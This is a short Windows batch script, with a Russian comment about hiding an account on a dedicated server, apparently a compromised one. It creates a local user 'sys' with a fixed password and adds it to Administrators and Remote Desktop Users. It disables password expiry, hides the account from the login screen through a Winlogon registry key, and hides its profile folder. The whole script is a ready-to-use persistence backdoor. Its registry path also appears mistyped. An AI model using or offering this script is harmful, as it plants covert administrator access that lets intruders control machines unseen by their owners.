net user sys p@ss123 /add
net localgroup Administrators sys /add             
net localgroup "Remote Desktop Users" sys /add 
net accounts /maxpwage:unlimited
@echo off
::скрытие учетки на дедике
echo *** hide userAccount on the Dedicated Server ***
reg add HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v sys /t REG_DWORD /d 0 
echo *** account is hidden ***
echo *** done ***
pause
attrib +h "C:\Users\sys"
